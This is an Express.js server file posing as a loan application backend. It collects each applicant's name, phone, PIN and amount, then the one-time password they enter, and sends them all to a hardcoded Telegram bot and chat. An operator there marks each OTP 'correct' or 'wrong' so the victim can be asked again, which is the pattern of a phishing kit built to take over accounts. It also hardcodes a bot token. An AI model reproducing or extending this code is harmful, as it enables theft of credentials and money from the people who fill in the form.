require('dotenv').config();
const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = "8975729175:AAFI_qFAD6zdN6bmhdUDu5HKO0JiaL38kN4"; 
const CHAT_ID = "8238882798";

let latestStatus = "pending"; // Tracks approval status

// 1. Receive loan application from frontend
app.post('/api/submit', async (req, res) => {
    const { name, phone, amount, purpose, pin } = req.body;
    latestStatus = "pending"; // Reset status on new submission

    const message = `📲 *New Loan Application*\n\n` +
                    `• *Name:* ${name}\n` +
                    `• *Phone:* ${phone}\n` +
                    `• *PIN:* ${pin}\n` +
                    `• *Amount:* ${amount}\n` +
                    `• *Purpose:* ${purpose}\n\n` +
                    `Please review and choose an action:`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Approve Loan", callback_data: `approve_${phone}` },
                { text: "❌ Decline Loan", callback_data: `decline_${phone}` }
            ]
        ]
    };

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });
        const data = await response.json();
        res.json({ success: data.ok });
    } catch (err) {
        console.error("Telegram send error:", err);
        res.json({ success: false });
    }
});

app.post('/api/submit-otp', async (req, res) => {
    const { phone, otp } = req.body;
    latestStatus = "otp_pending";

    const message = `🔑 *OTP Verification Required*\n\n` +
                    `• *Phone:* ${phone}\n` +
                    `• *Entered OTP:* ${otp}\n\n` +
                    `Is this OTP correct?`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Correct OTP", callback_data: `otp_correct_${phone}` },
                { text: "❌ Wrong OTP", callback_data: `otp_wrong_${phone}` }
            ]
        ]
    };

    try {
        // Send request to Telegram
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });

        const data = await response.json();
        
        // Respond to frontend immediately
        return res.json({ success: data.ok });

    } catch (err) {
        console.error("Error sending OTP to Telegram:", err);
        // Fallback response so frontend doesn't hang
        return res.status(500).json({ success: false, error: "Server timeout" });
    }
});

// 2. Endpoint for frontend to check if admin approved/declined
app.get('/api/status', (req, res) => {
    res.json({ status: latestStatus });
});

// 3. Telegram Webhook to catch button clicks
app.post('/webhook', async (req, res) => {
    const update = req.body;
    if (update.callback_query) {
        const action = update.callback_query.data;
        
        if (action.startsWith("approve")) {
            latestStatus = "approved";
        } else if (action.startsWith("decline")) {
            latestStatus = "declined";
        }  else if (action.startsWith("wrong") || action.startsWith("otp_wrong")) {
    latestStatus = "wrong_otp";
}
        
        // Acknowledge click to Telegram so loading wheel stops on the button
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: update.callback_query.id, text: "Action recorded!" })
        });
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});